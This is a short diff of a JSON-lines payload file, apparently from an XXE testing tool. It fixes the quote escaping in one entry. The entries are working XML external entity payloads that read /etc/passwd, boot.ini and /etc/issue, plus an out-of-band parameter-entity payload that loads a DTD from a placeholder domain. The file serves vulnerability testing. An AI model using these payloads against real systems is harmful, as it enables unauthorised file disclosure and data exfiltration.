@@ -4,4 +4,4 @@
 {"vector":"<!DOCTYPE docem [<!ELEMENT docem ANY ><!ENTITY xxe_canary_3 SYSTEM \"file:///etc/passwd\">]>","reference":"&xxe_canary_3;"}
 {"vector":"<!DOCTYPE docem [<!ELEMENT docem ANY ><!ENTITY xxe_canary_4 SYSTEM \"file:///c:/boot.ini\">]>","reference":"&xxe_canary_4;"}
 {"vector":"<!DOCTYPE docem [<!ELEMENT docem ANY ><!ENTITY xxe_canary_5 SYSTEM \"file:///etc/issue\">]>","reference":"&xxe_canary_5;"}
-{"vector":"<!DOCTYPE docem [<!ELEMENT docem ANY ><!ENTITY % xxe_canary_6 SYSTEM \"file:///etc/issue\"><!ENTITY % dtd SYSTEM "custom_domain">%dtd;%trick;]>  ]>","reference":""}
+{"vector":"<!DOCTYPE docem [<!ELEMENT docem ANY ><!ENTITY % xxe_canary_6 SYSTEM \"file:///etc/issue\"><!ENTITY % dtd SYSTEM \"custom_domain\">%dtd;%trick;]>  ]>","reference":""}
